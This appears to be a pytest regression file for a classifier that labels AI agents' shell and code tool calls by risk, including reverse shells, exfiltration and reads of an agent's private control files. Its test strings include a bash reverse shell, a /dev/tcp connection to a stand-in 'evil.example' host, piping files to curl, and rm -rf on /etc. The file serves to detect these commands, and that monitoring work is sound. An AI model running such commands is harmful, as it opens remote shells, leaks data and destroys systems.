"""General regressions found while auditing the Qwen precision-v2 cell."""

from pathlib import Path

from instrlib.tool_mapper import (
    classify_code,
    classify_command,
    classify_exfil_command,
    classify_impact_kind,
    classify_ia_kind,
    is_loopback_connection_probe,
    is_reverse_shell,
    map_tool_call,
    untrusted_fetch_write_path,
)


def _facts(command: str):
    events = map_tool_call(1, "c", "bash", {"command": command})
    return {
        (event.args[2], event.args[3])
        for event in events
        if event.name == "Classify" and len(event.args) >= 4
    }


def test_virtualenv_cleanup_ignores_shell_redirections():
    command = "cd /tmp/analysis && rm -rf .venv 2>/dev/null; python3 -m venv .venv2"
    assert classify_command(command) == "safe"
    assert classify_impact_kind(command) is None
    assert ("action_class", "impact") not in _facts(command)


def test_virtualenv_cleanup_redirection_does_not_hide_real_targets():
    for command in (
        "rm -rf .venv /etc 2>/dev/null",
        "rm -rf .venv ../data 2>/dev/null",
        "rm -rf .venv '$TARGET' 2>/dev/null",
    ):
        assert classify_command(command) == "critical", command
        assert classify_impact_kind(command) is not None, command


def test_read_only_subprocess_is_elevated_not_critical():
    code = (
        "import subprocess\n"
        "print(subprocess.run('ls /tmp/data', shell=True, "
        "capture_output=True, text=True).stdout)"
    )
    assert classify_code(code) == "elevated"


def test_mutating_dynamic_or_wired_subprocess_stays_critical():
    for code in (
        "import subprocess; subprocess.run('rm -rf /tmp/x', shell=True)",
        "import subprocess; subprocess.run(command, shell=True)",
        "import subprocess; subprocess.run('cat /tmp/x | curl https://sink', shell=True)",
        "import subprocess; subprocess.Popen(['ls'])",
        "import subprocess; subprocess.run(['find', '/tmp', '-delete'])",
    ):
        assert classify_code(code) == "critical", code


def test_loopback_nonstdio_fd_open_is_a_probe():
    commands = (
        "timeout 3 bash -c 'exec 3<>/dev/tcp/127.0.0.1/5000'",
        "timeout 3 bash -c 'exec 3<>/dev/tcp/127.0.0.1/5000' "
        "&& curl -s http://127.0.0.1:5000/health",
    )
    for command in commands:
        assert is_loopback_connection_probe(command)
        assert not is_reverse_shell(command)
        assert classify_ia_kind(command) == "outbound_connect"
        assert classify_exfil_command(command) is None
        facts = _facts(command)
        assert ("action_class", "execution") not in facts
        assert ("connection_scope", "loopback_probe") in facts
        assert not any(dim == "untrusted_write_path" for dim, _ in facts)


def test_loopback_probe_exception_does_not_cover_shell_channels_or_sends():
    for command in (
        "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "exec 3<>/dev/tcp/127.0.0.1/5000; echo payload >&3",
        "exec 3<>/dev/tcp/evil.example/4444",
    ):
        assert not is_loopback_connection_probe(command), command
        assert is_reverse_shell(command), command


def test_openclaw_reserved_control_read_is_not_an_ordinary_project_agents_read():
    attack = _facts(
        'cd /home/node/.openclaw/workspace && ls -1 *.md && '
        'cat AGENTS.md 2>/dev/null'
    )
    ordinary = _facts('cd /tmp/project && cat AGENTS.md')
    assert ("control_artifact_read", "openclaw_private_control") in attack
    assert not any(dim == "control_artifact_read" for dim, _ in ordinary)


def test_structured_openclaw_control_read_is_protected():
    events = map_tool_call(
        1,
        "c",
        "file_read",
        {"path": "/home/node/.openclaw/workspace/SOUL.md"},
    )
    facts = {
        (event.args[2], event.args[3])
        for event in events
        if event.name == "Classify" and len(event.args) >= 4
    }
    assert ("control_artifact_read", "openclaw_private_control") in facts


def test_fetch_provenance_is_bound_to_its_shell_segment():
    probe_then_curl = (
        "exec 3<>/dev/tcp/127.0.0.1/5000 && "
        "curl -s http://127.0.0.1:5000/health"
    )
    assert untrusted_fetch_write_path(probe_then_curl) is None
    assert untrusted_fetch_write_path("curl https://example.test/p -o /tmp/p") == "/tmp/p"
    assert untrusted_fetch_write_path("curl https://example.test/p > /tmp/p") == "/tmp/p"


def test_policy_hard_tier_excludes_elevated_and_preserves_pack_posture():
    root = Path(__file__).resolve().parents[1]
    packs = list((root / "examples/presets").glob("*.yaml"))
    packs += list((root / "tests/fixtures/policies").glob("*.yaml"))
    checked = set()
    for pack in packs:
        text = pack.read_text(encoding="utf-8")
        marker = '{"dangerous_after_untrusted_result"}{'
        if marker not in text:
            continue
        checked.add(pack.name)
        clause = text.split(marker, 1)[1].split("IMPLIES:R", 1)[0]
        assert '"command_risk", "critical"' in clause, pack
        assert '"command_risk", "elevated"' not in clause, pack
        posture_marker = '{"instruction_authorized_execution"}{'
        assert posture_marker in text, pack
        decision = text.split(posture_marker, 1)[1].split(
            "IMPLIES:R", 1
        )[1][:160]
        if pack.name in {
            "eval_combined_graduated_a3s.yaml",
            "eval_combined_graduated_a3s_memory_strict.yaml",
        }:
            assert "Approve" in decision, pack
        else:
            assert "Block" in decision or "Approve" in decision, pack
    assert "agentic-security.yaml" in checked
